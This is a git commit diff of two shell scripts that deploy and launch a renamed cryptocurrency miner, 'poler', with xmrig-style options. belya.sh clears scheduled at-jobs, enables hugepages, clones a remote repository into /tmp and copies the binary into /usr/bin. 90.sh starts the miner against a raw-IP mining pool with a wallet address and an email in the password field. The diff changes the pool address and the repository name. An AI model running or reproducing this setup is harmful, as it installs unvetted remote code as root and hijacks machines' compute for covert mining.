2a7d4e7388142337a25c0a64f835bcd809a61dd0
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-28 01:36:15 +0300

    w17

--- 90.sh
+++ 90.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 85 --cpu-priority 3 -o 185.251.39.25:6028 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w14-expertmode:ivanovandrey1984g@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 85 --cpu-priority 3 -o 192.155.111.176:5999 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w17-fckin-final2:ivanovandrey1984g@gmail.com -k
--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/expertmode/
+rm -rf /tmp/fckin-final2/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir expertmode
-git clone https://github.com/masketteland/expertmode.git /tmp/expertmode
-cd /tmp/expertmode
-chmod +x /tmp/expertmode/poler
+cd /tmp && mkdir fckin-final2
+git clone https://github.com/masketteland/fckin-final2.git /tmp/fckin-final2
+cd /tmp/fckin-final2
+chmod +x /tmp/fckin-final2/poler
 chmod 777 ./*.sh
-cp /tmp/expertmode/poler /usr/bin/
+cp /tmp/fckin-final2/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
